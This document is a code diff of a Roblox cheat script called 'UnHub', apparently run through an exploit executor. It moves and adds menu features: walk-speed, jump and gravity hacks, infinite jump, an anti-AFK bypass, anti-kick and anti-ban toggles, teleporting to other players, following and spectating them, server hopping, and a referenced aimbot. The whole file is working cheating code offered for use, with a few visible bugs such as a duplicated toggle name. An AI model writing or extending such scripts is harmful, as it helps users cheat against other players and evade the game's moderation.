@@ -13,6 +13,7 @@ local OldGravity = workspace.Gravity
 local RunService = game:GetService("RunService")
 local hrp = player.Character.HumanoidRootPart
 local mouse = player:GetMouse()
+local ST = Instance.new("ScreenGui")
 local AiChat
 local Lighting = game:GetService("Lighting")
 local TestService = game:GetService("TestService")
@@ -47,6 +48,20 @@ local SpeedAnimation = 1
 local ToDisable = {Textures = true, VisualEffects = true, Parts = true, Particles = true, Sky = true}
 local ToEnable = {FullBright = false}
 local Stuff = {}
+local RunAntiAfk = nil
+local RunAntiFling = nil
+local RunAnimationSpeed = nil
+local RunAntiKick = false
+local RunAntiBan = false
+local speed = 1
+local CanWalkToPlayer = false
+local WalkToPlayerTarget = nil
+local TpToPlayerTarget = nil
+local ac1 = nil
+local EnableFpsCap = false
+local X = nil
+local FPSLimit = 60
+local clock = 8
 
 task.spawn(function()
     pcall(function()
@@ -139,6 +154,17 @@ local function getFullPath(obj)
     end
 end
 
+RunService.Heartbeat:Connect(function()
+    if EnableFpsCap then
+    	if os.clock() - clock < 1 / FPSLimit then
+    		repeat
+    
+    		until os.clock() - clock >= 1 /FPSLimit
+    	end
+    	clock = os.clock()
+	end
+end)
+
 task.spawn(function()
 local Window = Rayfield:CreateWindow({
    Name = "UnHub | by LE_GO89",
@@ -176,9 +202,9 @@ local Username = Main:CreateSection("Username: " .. player.Name)
 local Mouse2D = Main:CreateSection("Mouse 2D: X: 0 Y: 0")
 local Mouse3D = Main:CreateSection("Mouse 3D: X: 0 Y: 0 Z: 0")
 local PartPath = Main:CreateSection("Part Path: nil")
-local Friend = Main:CreateSection("Friend: " ..(friend and friend.count or nil))
+local Friend = Main:CreateSection("Friend: " ..(friend and friend.count or "nil"))
 local Follower = Main:CreateSection("Follower: " .. (follower and follower.count or "nil"))
-local Following = Main:CreateSection("Following: " ..(following and following.count or nil))
+local Following = Main:CreateSection("Following: " ..(following and following.count or "nil"))
 local Name = Main:CreateSection("Display Name: " .. player.DisplayName)
 local UserId = Main:CreateSection("UserId: " .. player.UserId)
 local Age = Main:CreateSection("Account Age: " .. player.AccountAge)
@@ -206,15 +232,15 @@ pcall(function()
 	end
 end)
 
-local Movement = Window:CreateTab("Movement", 9657060536)
-Movement:CreateSection("Walk")
+local Client = Window:CreateTab("Client", 2242016188)
+Client:CreateSection("Walk")
 
-Movement:CreateButton({Name = "Reset", Callback = function()
+Client:CreateButton({Name = "Reset", Callback = function()
     player.Character.Humanoid.WalkSpeed = OldWalkSpeed
     WalkSpeedSlider:Set(OldWalkSpeed)
 end})
 
-Movement:CreateInput({Name = "Walk Speed", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
+Client:CreateInput({Name = "Walk Speed", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
     local number = tonumber(Value)
     if number then
         player.Character.Humanoid.WalkSpeed = number
@@ -222,21 +248,21 @@ Movement:CreateInput({Name = "Walk Speed", CurrentValue = "", PlaceholderText = 
     end
 end})
 
-WalkSpeedSlider = Movement:CreateSlider({Name = "Walk Speed", Range = {0, 1000}, Increment = 1, Suffix = "Speed", CurrentValue = OldWalkSpeed, Flag = "Slider1", Callback = function(Value)
+WalkSpeedSlider = Client:CreateSlider({Name = "Walk Speed", Range = {0, 1000}, Increment = 1, Suffix = "Speed", CurrentValue = OldWalkSpeed, Flag = "Slider1", Callback = function(Value)
     local number = tonumber(Value)
     if number then
         player.Character.Humanoid.WalkSpeed = number
     end
 end})
 
-Movement:CreateSection("Jump")
+Client:CreateSection("Jump")
 
-Movement:CreateButton({Name = "Reset", Callback = function()
+Client:CreateButton({Name = "Reset", Callback = function()
     player.Character.Humanoid.JumpPower = OldJumpPower
     JumpPowerSlider:Set(OldJumpPower)
 end})
 
-Movement:CreateInput({Name = "Jump Power", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
+Client:CreateInput({Name = "Jump Power", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
     local number = tonumber(Value)
     if number then
         player.Character.Humanoid.JumpPower = number
@@ -244,21 +270,21 @@ Movement:CreateInput({Name = "Jump Power", CurrentValue = "", PlaceholderText = 
     end
 end})
 
-JumpPowerSlider = Movement:CreateSlider({Name = "Jump Power", Range = {0, 1000}, Increment = 1, Suffix = "Power", CurrentValue = OldJumpPower, Flag = "Slider1", Callback = function(Value)
+JumpPowerSlider = Client:CreateSlider({Name = "Jump Power", Range = {0, 1000}, Increment = 1, Suffix = "Power", CurrentValue = OldJumpPower, Flag = "Slider1", Callback = function(Value)
     local number = tonumber(Value)
     if number then
         player.Character.Humanoid.JumpPower = number
     end
 end})
 
-Movement:CreateSection("Gravity")
+Client:CreateSection("Gravity")
 
-Movement:CreateButton({Name = "Reset", Callback = function()
+Client:CreateButton({Name = "Reset", Callback = function()
     workspace.Gravity = OldGravity
     Gravity1Slider:Set(OldGravity)
 end})
 
-Movement:CreateInput({Name = "Gravity", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
+Client:CreateInput({Name = "Gravity", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
     local number = tonumber(Value)
     if number then
         workspace.Gravity = number
@@ -266,10 +292,543 @@ Movement:CreateInput({Name = "Gravity", CurrentValue = "", PlaceholderText = "Va
     end
 end})
 
-Gravity1Slider = Movement:CreateSlider({Name = "Gravity", Range = {-1000, 1000}, Increment = 1, Suffix = "Power", CurrentValue = OldGravity, Flag = "Slider1", Callback = function(Value)
+Gravity1Slider = Client:CreateSlider({Name = "Gravity", Range = {-1000, 1000}, Increment = 1, Suffix = "Power", CurrentValue = OldGravity, Flag = "Slider1", Callback = function(Value)
     local number = tonumber(Value)
     if number then
         workspace.Gravity = math.floor(number)
+    end
+end})
+
+Client:CreateSection("Game")
+
+Client:CreateToggle({Name = "Anti Afk Bypass", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    local vu = game:GetService("VirtualUser")
+    if Value then
+    	RunAntiAfk = game:GetService("Players").LocalPlayer.Idled:connect(function()
+    		vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    		wait(1)
+    		vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    	end)
+    else
+        if RunAntiAfk then
+            RunAntiAfk:Disconnect()
+            RunAntiAfk = nil
+        end
+    end
+end})
+
+Client:CreateToggle({Name = "Anti Fling", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    if Value then
+        RunAntiFling = RunService.Stepped:Connect(function()
+            for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
+    			if plr ~= player then
+    				local char = plr.Character
+    				if char and char.Parent then
+    					for _, v in pairs(char:GetDescendants()) do
+    						if v:IsA("BasePart") then
+    							v.CanCollide = false
+    							v.Velocity = Vector3.new(0, 0, 0)
+    							v.RotVelocity = Vector3.new(0, 0, 0)
+    						end
+    					end
+    				end
+    			end
+    		end
+        end)
+    else
+        if RunAntiFling then
+            RunAntiFling:Disconnect()
+            RunAntiFling = nil
+            for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
+    			if plr ~= player then
+    				local char = plr.Character
+    				if char and char.Parent then
+    					for _, v in pairs(char:GetDescendants()) do
+    						if v:IsA("BasePart") then
+    							v.CanCollide = true
+    							v.Velocity = Vector3.new(0, 0, 0)
+    							v.RotVelocity = Vector3.new(0, 0, 0)
+    						end
+    					end
+    				end
+    			end
+    		end
+        end
+    end
+end})
+
+Client:CreateToggle({Name = "Anti Kick", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    RunAntiKick = Value
+end})
+
+Client:CreateToggle({Name = "Anti Kick", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    RunAntiBan = Value
+end})
+
+Client:CreateButton({Name = "Fps Booster", Callback = function()
+    EnabledFps()
+end})
+
+Client:CreateToggle({Name = "Black Screen", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    local Gui = game.CoreGui:FindFirstChild("ScreenFrame")
+        
+    if not Gui and Value then
+        Gui = Instance.new("ScreenGui")
+        Gui.Name = "ScreenFrame"
+        Gui.ResetOnSpawn = false
+        Gui.Parent = game.CoreGui
+    end
+    
+    if Value then
+        if not Gui:FindFirstChild("Black") then
+            local Frame = Instance.new("Frame")
+            Frame.Size = UDim2.new(1, 1000, 1, 1000)
+            Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+            Frame.Name = "Black"
+            Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+            Frame.BackgroundTransparency = 0
+            Frame.ZIndex = 10
+            Frame.Parent = Gui
+        end
+    else
+        if Gui and Gui:FindFirstChild("Black") then
+            Gui.Black:Destroy()
+        end
+    end
+end})
+
+Client:CreateToggle({Name = "White Screen", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    local Gui = game.CoreGui:FindFirstChild("ScreenFrame")
+        
+    if not Gui and Value then
+        Gui = Instance.new("ScreenGui")
+        Gui.Name = "ScreenFrame"
+        Gui.ResetOnSpawn = false
+        Gui.Parent = game.CoreGui
+    end
+    
+    if Value then
+        if not Gui:FindFirstChild("White") then
+            local Frame = Instance.new("Frame")
+            Frame.Size = UDim2.new(1, 1000, 1, 1000)
+            Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+            Frame.Name = "White"
+            Frame.BackgroundColor3 = Color3.new(1, 1, 1)
+            Frame.BackgroundTransparency = 0
+            Frame.ZIndex = 10
+            Frame.Parent = Gui
+        end
+    else
+        if Gui and Gui:FindFirstChild("White") then
+            Gui.White:Destroy()
+        end
+    end
+end})
+
+Client:CreateSlider({Name = "Fps Cap", Range = {1, 240}, Increment = 1, Suffix = "Fps", CurrentValue = 60, Flag = "Slider1", Callback = function(Value)
+    FPSLimit = Value
+end})
+
+Client:CreateToggle({Name = "Enable Fps Cap", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    EnableFpsCap = Value
+end})
+
+Client:CreateSection("Position Player")
+
+local TargetTp = Client:CreateLabel("Player: nil", 4483362458, Color3.fromRGB(255, 255, 255), false)
+Client:CreateInput({Name = "Teleport", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(Text)
+    local txt = tostring(Text):lower()
+    local localPlayer = game.Players.LocalPlayer
+    local localChar = localPlayer.Character
+    local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
+
+    if not localHRP then return end
+
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= localPlayer then
+            if string.find(player.Name:lower(), txt) then
+                TargetTp:Set("Player: " ..player.Name, 4483362458, Color3.fromRGB(255, 255, 255), false)
+                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                TpToPlayerTarget = player
+                if targetHRP then
+                    localHRP.CFrame = targetHRP.CFrame
+                    break
+                end
+            end
+        end
+    end
+end})
+
+local TargetFollow = Client:CreateLabel("Player: nil", 4483362458, Color3.fromRGB(255, 255, 255), false)
+Client:CreateInput({Name = "Follow", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(Text)
+    local txt = tostring(Text):lower()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= localPlayer then
+            if string.find(player.Name:lower(), txt) then
+                TargetFollow:Set("Player: " ..player.Name, 4483362458, Color3.fromRGB(255, 255, 255), false)
+                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                if targetHRP then
+                    WalkToPlayerTarget = player
+                end
+            end
+        end
+    end
+end})
+
+local TargetSp = Client:CreateLabel("Player: nil", 4483362458, Color3.fromRGB(255, 255, 255), false)
+Client:CreateInput({Name = "Spectator", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(txt)
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player ~= game.Players.LocalPlayer then
+            local found = string.find(player.Name:lower(), txt)
+            if found then
+                TargetSp:Set("Player: " ..player.Name, 4483362458, Color3.fromRGB(255, 255, 255), false)
+                local cam = workspace.CurrentCamera
+                if player.Character and player.Character:FindFirstChild("Humanoid") then
+                    cam.CameraSubject = player.Character.Humanoid
+                    break
+                end
+            end
+        end
+    end
+end})
+
+local TargetPosition = Client:CreateLabel("X: nil Y: nil Z: nil", 4483362458, Color3.fromRGB(255, 255, 255), false)
+Client:CreateInput({Name = "Teleport To Position", CurrentValue = "", PlaceholderText = "Position", RemoveTextAfterFocusLost = true, Callback = function(txt)
+    local delimiter = string.find(txt, ",") and "," or " "
+    local coords = string.split(txt, delimiter)
+    if #coords ~= 3 then
+        return
+    end
+    local x = tonumber(coords[1])
+    local y = tonumber(coords[2])
+    local z = tonumber(coords[3])
+    TargetPosition:Set("X: " ..x .." Y: " ..y .." Z: " ..z, 4483362458, Color3.fromRGB(255, 255, 255), false)
+    if not x or not y or not z then
+        return
+    end
+    y = y + 1
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
+end})
+
+for _, player in ipairs(Players:GetPlayers()) do
+    table.insert(Playlist, player.Name)
+end
+
+local TP = Client:CreateDropdown({
+    Name = "Teleport",
+    Options = Playlist,
+    CurrentOption = {},
+    MultipleOptions = false,
+    Flag = "Dropdown1",
+    Callback = function(name)
+        local localPlayer = Players.LocalPlayer
+        local localChar = localPlayer.Character
+        local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
+        if not localHRP then return end
+
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Name:lower():find(name:lower()) then
+                TargetTp:Set("Player: " ..player.Name, 4483362458, Color3.fromRGB(255, 255, 255), false)
+                TpToPlayerTarget = player
+                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                if targetHRP then
+                    localHRP.CFrame = targetHRP.CFrame
+                    break
+                end
+            end
+        end
+    end
+})
+
+local WT = Client:CreateDropdown({
+    Name = "Follow",
+    Options = Playlist,
+    CurrentOption = {},
+    MultipleOptions = false,
+    Flag = "Dropdown1",
+    Callback = function(name)
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Name:lower():find(name:lower()) then
+                TargetFollow:Set("Player: " ..player.Name, 4483362458, Color3.fromRGB(255, 255, 255), false)
+                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                if targetHRP then
+                    WalkToPlayerTarget = player
+                    break
+                end
+            end
+        end
+    end
+})
+
+local SP = Client:CreateDropdown({
+    Name = "Spectator",
+    Options = Playlist,
+    CurrentOption = {},
+    MultipleOptions = false,
+    Flag = "Dropdown1",
+    Callback = function(name)
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Name:lower():find(name:lower()) then
+                local cam = workspace.CurrentCamera
+                TargetSp:Set("Player: " ..player.Name, 4483362458, Color3.fromRGB(255, 255, 255), false)
+                if player.Character and player.Character:FindFirstChild("Humanoid") then
+                    cam.CameraSubject = player.Character.Humanoid
+                    break
+                end
+            end
+        end
+    end
+})
+
+local CPN = Client:CreateDropdown({
+    Name = "Copy Player Name",
+    Options = Playlist,
+    CurrentOption = {},
+    MultipleOptions = false,
+    Flag = "Dropdown1",
+    Callback = function(name)
+        setclipboard(name)
+    end
+})
+
+Client:CreateButton({
+    Name = "Refresh",
+    Callback = function()
+        Playlist = {}
+        for _, player in ipairs(Players:GetPlayers()) do
+            table.insert(Playlist, player.Name)
+        end
+        CPN:Refresh(Playlist)
+        TP:Refresh(Playlist)
+        SP:Refresh(Playlist)
+        WT:Refresh(Playlist)
+    end
+})
+
+Client:CreateToggle({Name = "Enable Following", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    CanWalkToPlayer = Value
+end})
+
+Client:CreateButton({Name = "Teleport", Callback = function()
+    player.Character.HumanoidRootPart.CFrame = TpToPlayerTarget.Character.HumanoidRootPart.CFrame
+end})
+
+Client:CreateButton({Name = "Reset Spectator", Callback = function()
+    game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
+end})
+
+Client:CreateSection("Game & Server")
+
+Client:CreateInput({Name = "Game", CurrentValue = "", PlaceholderText = "GameId", RemoveTextAfterFocusLost = true, Callback = function(Value)
+    TeleportService:Teleport(Value)
+end})
+
+Client:CreateInput({Name = "Server", CurrentValue = "", PlaceholderText = "ServerId", RemoveTextAfterFocusLost = true, Callback = function(Value)
+    TeleportService:TeleportToPlaceInstance(game.PlaceId, Value, player)
+end})
+
+Client:CreateButton({Name = "Rejoin", Callback = function()
+    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
+end})
+
+Client:CreateButton({Name = "Server Hop", Callback = function()
+    local servers = {}
+    local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
+    local body = HttpService:JSONDecode(req)
+
+    if body and body.data then
+        for i, v in next, body.data do
+            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
+                table.insert(servers, 1, v.id)
+            end
+        end
+    end
+
+    if #servers > 0 then
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
+    end
+end})
+
+Client:CreateToggle({Name = "Auto Rejoin", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    AutoRejoin = Value
+end})
+
+Client:CreateSection("Character")
+
+Client:CreateButton({Name = "Reset", Callback = function()
+    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end})
+
+local InfiniteJumpEnabled = false
+local InfiniteJumpConnection
+
+Client:CreateToggle({Name = "Infinite Jump", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    InfiniteJumpEnabled = Value
+    if Value and not InfiniteJumpConnection then
+        InfiniteJumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
+            if InfiniteJumpEnabled then
+                local humanoid = game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                end
+            end
+        end)
+    elseif not Value and InfiniteJumpConnection then
+        InfiniteJumpConnection:Disconnect()
+        InfiniteJumpConnection = nil
+    end
+end})
+
+Client:CreateInput({Name = "Chat", CurrentValue = "", PlaceholderText = "Text", RemoveTextAfterFocusLost = true, Callback = function(txt)
+    if game:GetService('TextChatService').ChatVersion == Enum.ChatVersion.LegacyChatService then
+        game:GetService('ReplicatedStorage'):WaitForChild('DefaultChatSystemChatEvents'):WaitForChild('SayMessageRequest'):FireServer(txt, 'All')
+    else
+        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(txt)
+    end
+end})
+
+Client:CreateToggle({Name = "Sit", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    game.Players.LocalPlayer.Character.Humanoid.Sit = Value
+end})
+
+Client:CreateToggle({Name = "Equip All Toots", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    if Value then
+        for _, tools in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+            if tools:IsA("Tool") then
+                tools.Parent = game.Players.LocalPlayer.Character
+            end
+        end
+    else
+        for _, tools in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if tools:IsA("Tool") then
+                tools.Parent = game.Players.LocalPlayer.Backpack
+            end
+        end
+    end
+end})
+
+Client:CreateSlider({Name = "Pov View", Range = {0, 120}, Increment = 1, Suffix = "Pov", CurrentValue = cam.FieldOfView, Flag = "Slider1", Callback = function(Value)
+    local number = tonumber(Value)
+    if number then
+        cam.FieldOfView = number
+    end
+end})
+
+local Blur = game:GetService("Lighting"):FindFirstChild("Blur")
+if not Blur then
+    Blur = Instance.new("BlurEffect")
+    Blur.Parent = game:GetService("Lighting")
+    Blur.Size = 0
+end
+
+Client:CreateSlider({Name = "Blur", Range = {0, 100}, Increment = 1, Suffix = "Size", CurrentValue = Blur.Size, Flag = "Slider1", Callback = function(Value)
+    local Blur = game:GetService("Lighting"):FindFirstChild("Blur")
+    if not Blur then
+        Blur = Instance.new("BlurEffect")
+        Blur.Parent = game:GetService("Lighting")
+        Blur.Size = 0
+    end
+    Blur.Size = Value
+end})
+
+Client:CreateSection("Game")
+
+Client:CreateButton({Name = "Console", Callback = function()
+    game.StarterGui:SetCore("DevConsoleVisible", true)
+end})
+
+Client:CreateToggle({Name = "Day & Night", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    local lighting = game.Lighting
+    if Value then
+        lighting.TimeOfDay = 0
+    else
+        lighting.TimeOfDay = 12
+    end
+end})
+
+Client:CreateSection("Animations & Sounds")
+
+local s = Instance.new("Sound", game.Workspace)
+local a = Instance.new("Animation")
+local AT
+
+Client:CreateInput({Name = "Change Animation Speed", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
+    speed = tonumber(Value)
+end})
+
+Client:CreateToggle({Name = "Animation Speed", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    if Value then
+        local plr = game.Players.LocalPlayer
+        local chr = plr.Character
+        local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
+        RunAnimationSpeed = game:GetService("RunService").Heartbeat:Connect(function()
+            for _, track in pairs(hum:GetPlayingAnimationTracks()) do
+                track:AdjustSpeed(speed)
+            end
+        end)
+    else
+        if RunAnimationSpeed then
+            RunAnimationSpeed:Disconnect()
+            RunAnimationSpeed = nil
+        end
+    end
+end})
+
+Client:CreateToggle({Name = "Freeze Animation", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    local animate = game.Players.LocalPlayer.Character.Animate
+    local hum = game.Players.LocalPlayer.Character.Humanoid
+    if Value then
+        animate.Enabled = false
+        for _, track in pairs(hum:GetPlayingAnimationTracks()) do
+            track:AdjustSpeed(0)
+        end
+    else
+        animate.Enabled = true
+        for _, track in pairs(hum:GetPlayingAnimationTracks()) do
+            track:AdjustSpeed(1)
+        end
+    end
+end})
+
+Client:CreateInput({Name = "Load Animation", CurrentValue = "", PlaceholderText = "Animation Id", RemoveTextAfterFocusLost = true, Callback = function(txt)
+    if string.find(txt, "http://www.roblox.com") then
+        a.AnimationId = string.gsub(txt, "http://www.roblox.com/asset/?id=", "rbxassetid://")
+    elseif string.find(txt, "rbxassetid://") then
+    	a.AnimationId = txt
+    else
+        a.AnimationId = "rbxassetid://" ..txt
+    end
+end})
+
+Client:CreateToggle({Name = "Play", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    local hum = player.Character.Humanoid
+    if Value then
+        AT = hum:LoadAnimation(a)
+        AT:Play()
+    else
+        if AT then
+            AT:Stop()
+        end
+    end
+end})
+
+Client:CreateInput({Name = "Load Sound", CurrentValue = "", PlaceholderText = "Sound Id", RemoveTextAfterFocusLost = true, Callback = function(txt)
+    if string.find(txt, "http://www.roblox.com") then
+        s.SoundId = string.gsub(txt, "http://www.roblox.com/asset/?id=", "rbxassetid://")
+    elseif string.find(txt, "rbxassetid://") then
+    	s.SoundId = txt
+    else
+        s.SoundId = "rbxassetid://" ..txt
+    end
+end})
+
+Client:CreateToggle({Name = "Play", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    if Value then
+        s:Play()
+    else
+        if s.Playing then
+            s:Stop()
+        end
     end
 end})
 
@@ -731,537 +1290,6 @@ Aimbot:CreateSlider({Name = "Aimbot Speed", Range = {0, 100}, Increment = 0.1, S
     end
 end})
 
-local Other = Window:CreateTab("Other", 11713339600)
-
-local RunAntiAfk = nil
-local RunAntiFling = nil
-local RunAnimationSpeed = nil
-local speed = 1
-local CanWalkToPlayer = false
-local WalkToPlayerTarget = nil
-local TpToPlayerTarget = nil
-
-Other:CreateSection("Game Preformer")
-
-Other:CreateToggle({Name = "Anti Afk", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    local vu = game:GetService("VirtualUser")
-    if Value then
-    	RunAntiAfk = game:GetService("Players").LocalPlayer.Idled:connect(function()
-    		vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-    		wait(1)
-    		vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-    	end)
-    else
-        if RunAntiAfk then
-            RunAntiAfk:Disconnect()
-            RunAntiAfk = nil
-        end
-    end
-end})
-
-Other:CreateToggle({Name = "Anti Fling", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    if Value then
-        RunAntiFling = RunService.Stepped:Connect(function()
-            for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
-    			if plr ~= player then
-    				local char = plr.Character
-    				if char and char.Parent then
-    					for _, v in pairs(char:GetDescendants()) do
-    						if v:IsA("BasePart") then
-    							v.CanCollide = false
-    							v.Velocity = Vector3.new(0, 0, 0)
-    							v.RotVelocity = Vector3.new(0, 0, 0)
-    						end
-    					end
-    				end
-    			end
-    		end
-        end)
-    else
-        if RunAntiFling then
-            RunAntiFling:Disconnect()
-            RunAntiFling = nil
-            for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
-    			if plr ~= player then
-    				local char = plr.Character
-    				if char and char.Parent then
-    					for _, v in pairs(char:GetDescendants()) do
-    						if v:IsA("BasePart") then
-    							v.CanCollide = true
-    							v.Velocity = Vector3.new(0, 0, 0)
-    							v.RotVelocity = Vector3.new(0, 0, 0)
-    						end
-    					end
-    				end
-    			end
-    		end
-        end
-    end
-end})
-
-Other:CreateButton({Name = "Fps Booster", Callback = function()
-    EnabledFps()
-end})
-
-Other:CreateToggle({Name = "Black Screen", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    local Gui = game.CoreGui:FindFirstChild("ScreenFrame")
-        
-    if not Gui and Value then
-        Gui = Instance.new("ScreenGui")
-        Gui.Name = "ScreenFrame"
-        Gui.ResetOnSpawn = false
-        Gui.Parent = game.CoreGui
-    end
-    
-    if Value then
-        if not Gui:FindFirstChild("Black") then
-            local Frame = Instance.new("Frame")
-            Frame.Size = UDim2.new(1, 1000, 1, 1000)
-            Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-            Frame.Name = "Black"
-            Frame.BackgroundColor3 = Color3.new(0, 0, 0)
-            Frame.BackgroundTransparency = 0
-            Frame.ZIndex = 10
-            Frame.Parent = Gui
-        end
-    else
-        if Gui and Gui:FindFirstChild("Black") then
-            Gui.Black:Destroy()
-        end
-    end
-end})
-
-Other:CreateToggle({Name = "White Screen", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    local Gui = game.CoreGui:FindFirstChild("ScreenFrame")
-        
-    if not Gui and Value then
-        Gui = Instance.new("ScreenGui")
-        Gui.Name = "ScreenFrame"
-        Gui.ResetOnSpawn = false
-        Gui.Parent = game.CoreGui
-    end
-    
-    if Value then
-        if not Gui:FindFirstChild("White") then
-            local Frame = Instance.new("Frame")
-            Frame.Size = UDim2.new(1, 1000, 1, 1000)
-            Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-            Frame.Name = "White"
-            Frame.BackgroundColor3 = Color3.new(1, 1, 1)
-            Frame.BackgroundTransparency = 0
-            Frame.ZIndex = 10
-            Frame.Parent = Gui
-        end
-    else
-        if Gui and Gui:FindFirstChild("White") then
-            Gui.White:Destroy()
-        end
-    end
-end})
-
-Other:CreateSection("Position Player")
-
-local TargetTp = Other:CreateSection("Player: nil")
-
-Other:CreateInput({Name = "Teleport", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(Text)
-    local txt = tostring(Text):lower()
-    local localPlayer = game.Players.LocalPlayer
-    local localChar = localPlayer.Character
-    local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
-
-    if not localHRP then return end
-
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player ~= localPlayer then
-            if string.find(player.Name:lower(), txt) then
-                TargetTp:Set("Player: " ..player.Name)
-                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-                TpToPlayerTarget = player
-                if targetHRP then
-                    localHRP.CFrame = targetHRP.CFrame
-                    break
-                end
-            end
-        end
-    end
-end})
-
-local TargetFollow = Other:CreateSection("Player: nil")
-
-Other:CreateInput({Name = "Follow", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(Text)
-    local txt = tostring(Text):lower()
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player ~= localPlayer then
-            if string.find(player.Name:lower(), txt) then
-                TargetFollow:Set("Player: " ..player.Name)
-                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-                if targetHRP then
-                    WalkToPlayerTarget = player
-                end
-            end
-        end
-    end
-end})
-
-local TargetPosition = Other:CreateSection("X: nil Y: nil Z: nil")
-
-Other:CreateInput({Name = "Teleport To Position", CurrentValue = "", PlaceholderText = "Position", RemoveTextAfterFocusLost = true, Callback = function(txt)
-    local delimiter = string.find(txt, ",") and "," or " "
-    local coords = string.split(txt, delimiter)
-    if #coords ~= 3 then
-        return
-    end
-    local x = tonumber(coords[1])
-    local y = tonumber(coords[2])
-    local z = tonumber(coords[3])
-    TargetPosition:Set("X: " ..x .." Y: " ..y .." Z: " ..z)
-    if not x or not y or not z then
-        return
-    end
-    y = y + 1
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
-end})
-
-local TargetSp = Other:CreateSection("Player: nil")
-
-Other:CreateInput({Name = "Spectator", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(txt)
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player ~= game.Players.LocalPlayer then
-            local found = string.find(player.Name:lower(), txt)
-            if found then
-                TargetSp:Set("Player: " ..player.Name)
